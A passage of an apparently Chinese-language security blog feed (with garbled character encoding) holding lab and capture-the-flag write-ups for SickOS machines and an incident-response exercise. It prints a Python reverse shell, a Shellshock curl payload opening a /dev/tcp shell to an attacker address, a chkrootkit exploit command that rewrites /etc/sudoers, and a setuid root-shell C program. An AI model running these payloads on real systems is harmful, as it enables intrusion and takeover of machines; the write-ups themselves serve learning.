os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>kaliç›‘å¬ç«¯å£ï¼Œèšå‰‘ä¸Šè¿è¡Œå‘½ä»¤<code>python python.py</code>ï¼Œå¾—åˆ°ä¸€ä¸ªä¼ªç»ˆç«¯ã€‚<br><img src="https://img-blog.csdnimg.cn/direct/6164c2511cf0498c81a4cdc22e487081.png" alt="123"><br>æ‰§è¡Œæ–‡ä»¶linpeas.shï¼Œä¼¼ä¹æ²¡æœ‰å‘ç°ä»€ä¹ˆ</p>
<h2 id="è®¡åˆ’ä»»åŠ¡ææƒ"><a href="#è®¡åˆ’ä»»åŠ¡ææƒ" class="headerlink" title="è®¡åˆ’ä»»åŠ¡ææƒ"></a>è®¡åˆ’ä»»åŠ¡ææƒ</h2><p>è¿™åˆæ˜¯é‡è¦ä¸€æ­¥ï¼Œæƒ³ä¸åˆ°å“‡ã€‚ã€‚ã€‚<br>åˆ—å‡ºä¸å®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ–‡ä»¶å’Œç›®å½•</p>
<blockquote>
<p>www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;test$ ls -al &#x2F;etc&#x2F;cron*<br><img src="https://img-blog.csdnimg.cn/direct/e415f1d44e6b464c98277d27cc5e1785.png" alt="123"></p>
</blockquote>
<h3 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h3><p>chkrootkit version 0.49å­˜åœ¨æœ¬åœ°ææƒæ¼æ´<br><img src="https://img-blog.csdnimg.cn/direct/3b36f2fb4224479984a15cb5ba363c6b.png" alt="123"></p>
<blockquote>
<p>æ¼æ´åŸç†:chkrootkitæœ‰crontabï¼Œä¼šå®šæœŸä»¥rootèº«ä»½æ‰§è¡Œ&#x2F;tmp&#x2F;updateæ–‡ä»¶ã€‚å¦‚æœæ”»å‡»è€…çŸ¥é“ç®¡ç†å‘˜æ˜¯å®šæœŸè¿è¡Œchkrootkit(é€šè¿‡æŸ¥çœ‹cron.dailyè·çŸ¥)ï¼Œå¹¶ä¸”å¯¹&#x2F; tmp(æ²¡æœ‰æŒ‚è½½noexec)æœ‰å†™è®¿é—®æƒé™ï¼Œå°±å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è·å–rootæƒé™ã€‚</p>
</blockquote>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">We just found a serious vulnerability in the chkrootkit package, which
may allow local attackers to gain root access to a box in certain
configurations (/tmp not mounted noexec).

The vulnerability is located in the function slapper() in the
shellscript chkrootkit:

#
# SLAPPER.&#123;A,B,C,D&#125; and the multi-platform variant
#
slapper ()&#123;
   SLAPPER_FILES="$&#123;ROOTDIR&#125;tmp/.bugtraq $&#123;ROOTDIR&#125;tmp/.bugtraq.c"
   SLAPPER_FILES="$SLAPPER_FILES $&#123;ROOTDIR&#125;tmp/.unlock $&#123;ROOTDIR&#125;tmp/httpd \
   $&#123;ROOTDIR&#125;tmp/update $&#123;ROOTDIR&#125;tmp/.cinik $&#123;ROOTDIR&#125;tmp/.b"a
   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "
   OPT=-an
   STATUS=0
   file_port=

   if $&#123;netstat&#125; "$&#123;OPT&#125;"|$&#123;egrep&#125; "^tcp"|$&#123;egrep&#125; "$&#123;SLAPPER_PORT&#125;">
/dev/null 2>&amp;1
      then
      STATUS=1
      [ "$SYSTEM" = "Linux" ] &amp;&amp; file_port=`netstat -p $&#123;OPT&#125; | \
         $egrep ^tcp|$egrep "$&#123;SLAPPER_PORT&#125;" | $&#123;awk&#125; '&#123; print  $7 &#125;' |
tr -d :`
   fi
   for i in $&#123;SLAPPER_FILES&#125;; do
      if [ -f $&#123;i&#125; ]; then
         file_port=$file_port $i
         STATUS=1
      fi
   done
   if [ $&#123;STATUS&#125; -eq 1 ] ;then
      echo "Warning: Possible Slapper Worm installed ($file_port)"
   else
      if [ "$&#123;QUIET&#125;" != "t" ]; then echo "not infected"; fi
         return $&#123;NOT_INFECTED&#125;
   fi
&#125;


The line 'file_port=$file_port $i' will execute all files specified in
$SLAPPER_FILES as the user chkrootkit is running (usually root), if
$file_port is empty, because of missing quotation marks around the
variable assignment.

Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
easily take advantage of this.


Suggested fix: Put quotation marks around the assignment.

file_port="$file_port $i"


I will also try to contact upstream, although the latest version of
chkrootkit dates back to 2009 - will have to see, if I reach a dev there.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>å¤åˆ¶æ­¥éª¤:<br>-åœ¨&#x2F;tmpç›®å½•ä¸‹æ”¾ç½®ä¸€ä¸ªåä¸ºâ€™updateâ€™çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…¶æ‰€æœ‰è€…ä¸æ˜¯root<br>æŒ‚è½½noexecï¼Œæ˜¾ç„¶)<br>â€”è¿è¡Œchkrootkit(ä»¥uid 0ä¸ºä¾‹)<br>ç»“æœ:æ–‡ä»¶&#x2F;tmp&#x2F;updateå°†ä»¥rootèº«ä»½æ‰§è¡Œï¼Œå› æ­¤æœ‰æ•ˆ<br>å¦‚æœæ¶æ„å†…å®¹è¢«æ”¾ç½®åœ¨æ–‡ä»¶ä¸­ï¼Œå°±ä¼šåœ¨æ‚¨çš„ç›’å­ä¸­ç”Ÿæ ¹ã€‚<br>å¦‚æœæ”»å‡»è€…çŸ¥é“æ‚¨å®šæœŸè¿è¡Œchkrootkit(å¦‚åœ¨<br>å¹¶ä¸”å¯¹&#x2F;tmpæœ‰å†™è®¿é—®æƒé™(æ²¡æœ‰æŒ‚è½½noexec)ï¼Œä»–å¯ä»¥<br>å¾ˆå®¹æ˜“åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚<br>å»ºè®®ä¿®å¤:åœ¨èµ‹å€¼å¤„åŠ ä¸Šå¼•å·ã€‚<br>file_port &#x3D; â€œ file_portæˆ‘ç¾å…ƒâ€<br>æˆ‘ä¹Ÿä¼šå°½é‡è”ç³»ä¸Šæ¸¸ï¼Œè™½ç„¶æœ€æ–°çš„ç‰ˆæœ¬<br>chkrootkitå¯ä»¥è¿½æº¯åˆ°2009å¹´-å¦‚æœæˆ‘åœ¨é‚£é‡Œæ‰¾åˆ°ä¸€ä¸ªå¼€å‘äººå‘˜ï¼Œæˆ‘ä¼šçœ‹åˆ°ã€‚</p>
</blockquote>
<p>åœ¨&#x2F;tmpç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶updateï¼Œå¹¶ä¸”èµ‹äºˆæƒé™<br><code>www-data@ubuntu:/tmp$ touch update;chmod +x update</code><br>å†™å…¥å°†www-dateæ·»åŠ åˆ°sudoç»„çš„å‘½ä»¤</p>
<blockquote>
<p><code>echo &#39;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL)  NOPASSWD:ALL&quot; &gt; /etc/sudoers&#39; &gt; /tmp/update</code></p>
</blockquote>
<p>å–æ¯èŒ¶çš„æ—¶é—´å†è¾“å…¥å‘½ä»¤<code>sudo -l</code><br><img src="https://img-blog.csdnimg.cn/direct/df4a079c1eec4c7da1e42c017053bf4c.png" alt="132"></p>
<p><img src="https://img-blog.csdnimg.cn/direct/770472af6bb24b639fac9be292d09cd2.png" alt="123"><br>æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶newRule</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Generated by iptables-save v1.4.12 on Mon Apr 25 22:48:24 2016</span>
*filter
:INPUT DROP <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
:FORWARD ACCEPT <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
:OUTPUT DROP <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">80</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">8080</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">443</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">80</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">8080</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">443</span> <span class="token parameter variable">-j</span> ACCEPT
COMMIT
<span class="token comment"># Completed on Mon Apr 25 22:48:24 2016</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç»ˆäºçŸ¥é“é—®ä»€ä¹ˆåå¼¹shellçš„æ—¶å€™ä¸èƒ½ä½¿ç”¨6666ç«¯å£äº†ï¼ŒåŸæ¥æ˜¯é™å®šç«¯å£äº†ã€‚ã€‚ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªææƒçš„è„šæœ¬</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//shell.c</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chown root:root /tmp/update"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod 4755 /tmp/update"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>gcc shell.c -o &#x2F;tmp&#x2F;update</p>
</blockquote>
<p>ä¹‹åè¿è¡Œupdateæ–‡ä»¶</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»ä½“æ¥è¯´é¶æœºæœ‰ç‚¹æ„æ€ï¼Œé‡è¦çš„å‡ ç‚¹å°±æ˜¯PUTæ–¹å¼ä¸Šä¼ æœ¨é©¬ï¼Œåå¼¹shellçš„æ—¶å€™ç«¯å£çš„é™ç”¨ï¼Œä½¿ç”¨chkrootkitçš„ç‰ˆæœ¬æ¼æ´è¿›è¡Œææƒ</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
  </entry>
  <entry>
    <title>åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2</title>
    <url>/2024/03/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2"><a href="#åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2" class="headerlink" title="åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2"></a>åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2</h2><p>å‘ç° çŸ¥æ”»å–„é˜²å®éªŒå®¤å…¬ä¼—å·é‡Œæœ‰ä¸¤ä¸ªåº”æ€¥å“åº”é¶åœºï¼Œç»ƒä¹ åˆ°äº†ç¬¬äºŒä¸ªï¼Œè®°å½•ä¸€ä¸‹<a href="https://mp.weixin.qq.com/s/UHkPwopo0HZ330UKTJyXuw">åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2</a></p>
<h2 id="æŒ‘æˆ˜å†…å®¹"><a href="#æŒ‘æˆ˜å†…å®¹" class="headerlink" title="æŒ‘æˆ˜å†…å®¹"></a>æŒ‘æˆ˜å†…å®¹</h2><p>å‰æ™¯éœ€è¦ï¼šå°æåœ¨æŸå•ä½é©»åœºå€¼å®ˆï¼Œæ·±å¤œ12ç‚¹ï¼Œç”²æ–¹å·²ç»å›å®¶äº†ï¼Œå°æåˆšå·å·æ‘¸é±¼åï¼Œå‘ç°å®‰å…¨è®¾å¤‡æœ‰å‘Šè­¦ï¼Œäºæ˜¯ç«‹åˆ»åœæ‰äº†æœºå™¨å¼€å§‹æ’æŸ¥ã€‚</p>
<p>è¿™æ˜¯ä»–çš„æœåŠ¡å™¨ç³»ç»Ÿï¼Œè¯·ä½ æ‰¾å‡ºä»¥ä¸‹å†…å®¹ï¼Œå¹¶ä½œä¸ºé€šå…³æ¡ä»¶ï¼š</p>
<p>1.æ”»å‡»è€…çš„IPåœ°å€ï¼ˆä¸¤ä¸ªï¼‰ï¼Ÿ192.168.126.135&#x2F;</p>
<p>2.æ”»å‡»è€…çš„webshellæ–‡ä»¶åï¼Ÿsystem.php</p>
<p>3.æ”»å‡»è€…çš„webshellå¯†ç ï¼Ÿhack6618</p>
<p>4.æ”»å‡»è€…çš„ä¼ªQQå·ï¼Ÿ</p>
<p>5.æ”»å‡»è€…çš„ä¼ªæœåŠ¡å™¨IPåœ°å€ï¼Ÿ</p>
<p>6.æ”»å‡»è€…çš„æœåŠ¡å™¨ç«¯å£ï¼Ÿ</p>
<p>7.æ”»å‡»è€…æ˜¯å¦‚ä½•å…¥ä¾µçš„ï¼ˆé€‰æ‹©é¢˜ï¼‰ï¼Ÿ</p>
<p>8.æ”»å‡»è€…çš„éšè—ç”¨æˆ·åï¼Ÿ</p>
<h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>åœ¨å¯åŠ¨é¶æœºæ—¶ï¼Œå¦‚æœä½ çš„vmç‰ˆæœ¬ä¸º16ï¼Œè¯·å°†è™šæ‹Ÿæœºçš„vmxæ–‡ä»¶æ”¹ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/direct/3c01bc81e7db42c69300889a39d46927.png" alt="123"></p>
<p>ä¹‹åå°±æ­£å¸¸å¯åŠ¨é¶æœºäº†ã€‚<br>è¿›å…¥é¶æœºä¹‹åå…ˆå¼€å¯phpstudyçš„æœåŠ¡ï¼Œç„¶åæ ¹æ®é—®é¢˜å¯»æ‰¾ç­”æ¡ˆ<br><img src="https://img-blog.csdnimg.cn/direct/e478544a47be41119959900ab91192b0.png" alt="1"><br>æŸ¥çœ‹apacheæ—¥å¿—æ–‡ä»¶å¯ä»¥å‘ç°æ”»å‡»è€…çš„ä¸€ä¸ªipä¸º192.168.126.135ï¼Œ<img src="https://img-blog.csdnimg.cn/direct/6eb5a3d931a547c89916ea23d72e0c70.png" alt="13"></p>
<p>å°†æºç æ‹–å‡ºæ¥ä½¿ç”¨Dç›¾æ‰«æå¾—åˆ°æœ¨é©¬æ–‡ä»¶system.phpæ–‡ä»¶å¹¶ä¸”çŸ¥é“äº†å¯†ç <br><img src="https://img-blog.csdnimg.cn/direct/bad401e8c04143d0ad45c1985585813e.png" alt="132"><br>å¦‚æœè¦æŸ¥æ‰¾éšè—ç”¨æˆ·ï¼Œæœ‰å‡ ç§æ–¹æ³•ï¼š<br>1ã€æŸ¥çœ‹æ³¨å†Œè¡¨ï¼šwin+Rè¾“å…¥regeditå³å¯çœ‹åˆ°éšè—ç”¨æˆ·<code>hack887$</code><br>2ã€æ‰“å¼€æ§åˆ¶é¢æ¿-&gt;ç”¨æˆ·è´¦æˆ·-&gt;ç®¡ç†è´¦æˆ·</p>
<p>ç„¶åå†æ–‡æ¡£æ–‡ä»¶ä¸‹å‘ç°Tencent Filesæ–‡ä»¶å¤¹ï¼Œçœ‹åˆ°QQå·<br><img src="https://img-blog.csdnimg.cn/direct/4bc0755d3ce04f5c8cac565d2f71ba84.png" alt="132"><br>æ‰“å¼€QQå·æ–‡ä»¶ä¸‹çš„FileRecvæ–‡ä»¶å¤¹ï¼Œçœ‹åˆ°äº†é»‘å®¢ä¸Šä¼ çš„frpå·¥å…·ï¼ŒæŸ¥çœ‹é…ç½®æ–‡ä»¶frpc.iniæ–‡ä»¶</p>
<p><img src="https://img-blog.csdnimg.cn/direct/9f810b7962f14c7f810c950ccb133974.png" alt="465"></p>
<p>åˆ°è¿™é‡Œè¿˜å·®ä¸€ä¸ªæ”»å‡»è€…çš„å¦ä¸€ä¸ªipï¼Œæˆ‘æ˜¯æ²¡æ‰¾åˆ°ï¼Œçœ‹äº†ä¸€ä¸‹è§£é¢˜æ€è·¯ï¼Œå¦ä¸€ä¸ªIPæ˜¯ä½¿ç”¨è“é˜Ÿå·¥å…·ç®±çš„æ—¥å¿—åˆ†æå·¥å…·æ‰¾åˆ°çš„ã€‚</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
  </entry>
  <entry>
    <title>Vulnhub-sickos1.1</title>
    <url>/2024/03/08/Vulnhub-sickos1-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘æ‰“çš„è¿™ä¸¤ä¸ªé¶åœºå‡æ¶‰åŠåˆ°ä»£ç†ï¼Œå€¼å¾—å­¦ä¹ ã€‚</p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ä½¿ç”¨nmapå‘ç°ä¸»æœº192.168.206.152ã€‚æ‰«æå¼€äº†ä¸‰ä¸ªç«¯å£22ï¼Œ8080ï¼Œ3128ï¼Œä¿¡æ¯å¦‚ä¸‹ï¼š<br>:<img src="https://img-blog.csdnimg.cn/direct/ae48518e34cd41b2bace11afe01d6eff.png" alt="123"><br>å½“è®¿é—®<code>192.168.206.152:8080</code>çš„æ—¶å€™å‘ç°æ— å“åº”ï¼Œ8080ç«¯å£æ˜¾ç¤ºçš„httpä»£ç†å…³é—­ï¼Œ3128ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œè¿è¡Œç€ Squid HTTP ä»£ç† 3.1.19 ç‰ˆæœ¬ã€‚é‚£ä¹ˆæ”¹å˜ä¸€ä¸‹æµè§ˆå™¨çš„ä»£ç†å°±å¯ä»¥è®¿é—®ç½‘ç«™äº†ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/direct/98f1768860c146a5b3b4cff4e4a65422.png" alt="123"><br>ç„¶åè®¿é—®<a href="http://192.168.206.152/%E3%80%82">http://192.168.206.152/ã€‚</a><br>å°è¯•è¿›è¡Œç›®å½•æ‰«æï¼Œå‘ç°åœ¨ä½¿ç”¨kaliè¿›è¡Œç›®å½•æ‰«ææ—¶å¹¶æ— å“åº”<br><img src="https://img-blog.csdnimg.cn/direct/e5ead531f9134d7ea64dfd897ee0cf39.png" alt="123"></p>
<p>åœ¨æ‰«ææ—¶ä¹Ÿè¦é€šè¿‡ä»£ç†ï¼š<code>dirsearch -u http://192.168.206.152/ --proxy http://192.168.206.152:3128</code>æˆ–è€…<code>dirb http://192.168.206.152/ -p http://192.168.206.152:3128</code><br>æ‰«æåˆ°robots.txt,å­˜åœ¨wolfcmsç›®å½•<br><img src="https://img-blog.csdnimg.cn/direct/9fc16baeeadd44c39eead7dada2c2f8a.png" alt="123"><br>ç»§ç»­è¿›è¡Œæ·±åº¦ç›®å½•æ‰«æï¼Œæ²¡æœ‰æ‰¾åˆ°åå°ç™»é™†å…¥å£ï¼Œç½‘ä¸Šæœç´¢ä¸€ä¸‹ç›¸å…³æ¼æ´:<a href="https://cloud.tencent.com/developer/article/1047292">Wolf CMS æ–°æ—§ä¸¤ä¸ªç‰ˆæœ¬ä¸­çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ
</a><br>æ‰¾åˆ°åå°å…¥å£&#x2F;wolfcms&#x2F;?&#x2F;adminï¼Œå¼±å¯†ç admin&#x2F;admin<br>åœ¨fileä¸‹ä¸Šä¼ åå¼¹shellçš„PHPæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/direct/dd497660c3bf487fa0b7be670c61302d.png" alt="123"></p>
<p>kaliå¼€å¯ç›‘å¬6666ï¼Œé¶æœºè®¿é—®è¯¥æ–‡ä»¶<code>http://192.168.206.152/wolfcms/public/shell.php</code><br><img src="https://img-blog.csdnimg.cn/direct/26ed64e38a5b4853a17b66f5c56e6885.png" alt="123"></p>
<p>æ‰¾æ•æ„Ÿæ–‡ä»¶ï¼Œå‘ç°wolfcms&#x2F;config.phpæ–‡ä»¶ä¸­å­˜åœ¨æ•°æ®åº“è´¦å·å¯†ç <br><img src="https://img-blog.csdnimg.cn/direct/d5fe75fb34fb4461bf42a05b1d6443c9.png" alt="123"><br>å°è¯•è¿›è¡Œè¿æ¥å‘ç°æ— æ³•è¿æ¥ï¼Œç»§ç»­æ”¶é›†ä¿¡æ¯å‘ç°å­˜åœ¨ç”¨æˆ·sickosï¼Œå°è¯•ä½¿ç”¨æ•°æ®åº“å¯†ç åˆ‡æ¢åˆ°è¯¥ç”¨æˆ·sshè¿œç¨‹ç™»é™†<br><img src="https://img-blog.csdnimg.cn/direct/f042fb306fc7439d8240dd07c363f71d.png" alt="123"><br>å‘ç°å…·æœ‰sudoæ‰€æœ‰æƒé™<br><img src="https://img-blog.csdnimg.cn/direct/b6351fce09ef4499a6537657165a104c.png" alt="123"><br>ç›´æ¥sudo &#x2F;bin&#x2F;bashï¼Œæ‹¿åˆ°rootæƒé™<br><img src="https://img-blog.csdnimg.cn/direct/031d061fb5324d9db4fb41cf80fb3a36.png" alt="123"><br>è‡³æ­¤ç»“æŸï¼</p>
<h2 id="äºŒè§£"><a href="#äºŒè§£" class="headerlink" title="äºŒè§£"></a>äºŒè§£</h2><p>æœ‰å‘ç°ç½‘ä¸Šæœ‰ç¬¬äºŒç§è§£æ³•ï¼Œå¤ç°ä¸€ä¸‹<br>ä»–è¿™é‡Œä½¿ç”¨niktoæ‰«æåˆ°æ¼æ´<br><code>nikto -h 192.168.206.152 -useproxy http://192.168.206.152:3128</code><br><img src="https://img-blog.csdnimg.cn/direct/3cb32fd75d434632817244fdf89f3ac9.png" alt="798"></p>
<p>å‘ç°ç ´å£³æ¼æ´cve-2014-6271</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>å…ˆæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨<br><code>sudo curl -v --proxy http://192.168.206.152:3128 http://192.168.206.152/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; echo &#39;Content-Type: text/plain&#39;; echo; echo; /usr/bin/echo; exit&quot;&quot;</code><br><img src="https://img-blog.csdnimg.cn/direct/f0f51a6b375c4f4280e4e79d97ac8215.png" alt="123"></p>
<p>æˆåŠŸæ‰§è¡Œã€‚</p>
<h3 id="shellshockæ¼æ´åˆ©ç”¨"><a href="#shellshockæ¼æ´åˆ©ç”¨" class="headerlink" title="shellshockæ¼æ´åˆ©ç”¨"></a>shellshockæ¼æ´åˆ©ç”¨</h3><h4 id="msfvenomåå¼¹shell"><a href="#msfvenomåå¼¹shell" class="headerlink" title="msfvenomåå¼¹shell"></a>msfvenomåå¼¹shell</h4><p>ä½¿ç”¨msfæ¥ç”Ÿæˆåå¼¹é©¬<br><img src="https://img-blog.csdnimg.cn/direct/579ef83031714acbb7162a8a9c8751b4.png" alt="123"><br>æ‰§è¡Œå‘½ä»¤ï¼š<code>curl -v --proxy http://192.168.206.152:3128 http://192.168.206.152/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; 0&lt;&amp;120-;exec 120&lt;&gt;/dev/tcp/192.168.206.138/6666;/bin/bash &lt;&amp;120 &gt;&amp;120 2&gt;&amp;120&quot;</code><br>å¦‚æœä¸€æ¬¡ä¸è¡Œå¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œkaliç›‘å¬ç«¯å£<code>nc -lnvp 6666</code><br>åå¼¹æˆåŠŸåæŸ¥çœ‹æƒé™ä¸ºwww-data</p>
<h4 id="å®šæ—¶ä»»åŠ¡è¿›è¡Œææƒ"><a href="#å®šæ—¶ä»»åŠ¡è¿›è¡Œææƒ" class="headerlink" title="å®šæ—¶ä»»åŠ¡è¿›è¡Œææƒ"></a>å®šæ—¶ä»»åŠ¡è¿›è¡Œææƒ</h4><p>åœ¨&#x2F;var&#x2F;wwwç›®å½•ä¸‹å‘ç°æ–‡ä»¶connect.pyæ–‡ä»¶ï¼Œè€Œä¸”æ–‡ä»¶æƒé™æ˜¯777<br><code>-rwxrwxrwx  1 root     root      109 Dec  5  2015 connect.py</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>

<span class="token keyword">print</span> <span class="token string">"I Try to connect things very frequently\n"</span>
<span class="token keyword">print</span> <span class="token string">"You may want to try my services"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ„æ€æ˜¯æ¶‰åŠåˆ°å®šæ—¶ä»»åŠ¡ï¼Ÿæœç´¢ä¸€ä¸‹ï¼Œå®šæ—¶ä»»åŠ¡æ–‡ä»¶æ–‡ä»¶åé€šå¸¸å¸¦æœ‰<strong>cron</strong>ï¼Œåˆ°&#x2F;etcç›®å½•ä¸‹æŸ¥æ‰¾ä¸€ä¸‹</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc$ <span class="token function">ls</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"cron"</span>
<span class="token function">ls</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"cron"</span>
cron.d
cron.daily
cron.hourly
cron.monthly
cron.weekly
<span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æœ€åå‘ç°cron.dç›®å½•ä¸‹çš„automateæ–‡ä»¶ä¸­å†…å®¹</p>
